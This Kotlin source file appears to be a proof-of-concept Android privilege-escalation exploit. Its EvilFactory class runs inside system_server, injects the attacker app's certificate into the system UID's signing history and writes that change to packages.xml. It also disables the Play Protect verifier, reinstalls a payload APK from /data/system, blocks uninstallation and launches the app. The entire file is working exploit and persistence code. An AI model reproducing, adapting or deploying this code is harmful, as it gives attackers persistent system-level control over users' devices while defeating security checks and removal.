package poc.sithi.tlpe

import android.annotation.SuppressLint
import android.app.AppComponentFactory
import android.content.ActivityNotFoundException
import android.content.Context
import android.content.Intent
import android.content.pm.ApplicationInfo
import android.os.Process
import android.provider.Settings
import android.util.Log
import androidx.core.net.toUri
import poc.sithi.tlpe.Utils.sh
import java.io.File
import java.lang.reflect.Array

@SuppressLint("PrivateApi", "MissingPermission", "RequestInstallPackagesPolicy")
class EvilFactory : AppComponentFactory() {
    val TAG: String = "TLPE"
    val TMP_APK: String = "/data/system/s.apk"
    lateinit var packageName: String
    lateinit var context: Context

    override fun instantiateClassLoader(cl: ClassLoader, aInfo: ApplicationInfo): ClassLoader {
        // return early if in our own process
        if (Process.myUid() == aInfo.uid) return super.instantiateClassLoader(cl, aInfo)

        Log.e(TAG, "===================================\n" +
                    "[+] Exploit successful!\n" +
                    "[+] Running as: [" + sh("id") + "]\n" +
                    "[+] Current stack trace:\n" + Thread.currentThread().getStackTrace().contentToString() +
                    "\n===================================")

        Thread {
            try {
                packageName = aInfo.packageName
                /* get system_server context */
                context = (Class.forName("android.app.ActivityThread")
                    .getMethod("currentApplication").invoke(null) as Context)
                val pm = RPMS()

                if (Utils.copyFromUri(context,
                        "content://poc.provider/".toUri(), TMP_APK)) {
                    Log.e(TAG, "[+] Retrieved system APK, attempting persistence...")

                    /* inject signatures, re-install app, and then block uninstallation */
                    injectSystemSignatures(pm)
                    reinstall()
                    pm.setBlockUninstallLPw(0, packageName, true)

                    for (i in 1..5) {
                        Thread.sleep(1000)
                        try {
                            context.startActivity(Intent().setClassName(packageName,
                                "$packageName.MainActivity")
                                .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK))
                        } catch (_: ActivityNotFoundException) {
                            Log.e(TAG, "[-] Exploit activity not ready, retrying ($i/5)...")
                        }
                    }
                } else Log.e(TAG, "[x] Failed to retrieve system APK")
            } catch (e: Exception) {
                Log.e(TAG, "[x] Unexpected error in persistence stage: ", e)
            }
        }.start()
        return super.instantiateClassLoader(cl, aInfo)
    }

    fun injectSystemSignatures(pm: RPMS) {
        try {
            val ourSigns = pm.getSigningDetails(pm.getPackageLPr(packageName))
            val ourCert = Array.get(ourSigns.javaClass.getMethod("getSignatures")
                .invoke(ourSigns)!!,0)
            ourCert.javaClass.getMethod("setFlags", Int::class.javaPrimitiveType)
                .invoke(ourCert, 2 /* CertCapabilities.SHARED_USER_ID */)

            val newSysCerts = Array.newInstance(ourCert.javaClass, 2)
            /* insert twice - most recent past signature isn't counted as rotation history candidate */
            Array.set(newSysCerts, 0, ourCert)
            Array.set(newSysCerts, 1, ourCert)

            val sysSigns = pm.getSigningDetails(pm.getSharedUserLPw("android.uid.system"))
            val pastCerts = sysSigns.javaClass.getDeclaredField("mPastSigningCertificates")
            pastCerts.isAccessible = true
            pastCerts.set(sysSigns, newSysCerts)
            Log.e(TAG, "[+] Injection successful, forcing packages.xml flush")

            pm.writeSettings()
            Log.e(TAG, "[+] Persistence successful, reinstalling...")

        } catch (e: Exception) {
            Log.e(TAG, "[x] Exception in injectSystemSignatures: ", e)
        }
    }

    fun reinstall() {
        /* force-disable play protect because it sometimes interferes with installation */
        Settings.Global.putInt(context.contentResolver,
            "package_verifier_user_consent", -1)

        Utils.uninstall(context, packageName)
        Thread.sleep(1000)
        Utils.install(context, File(TMP_APK))
    }

}
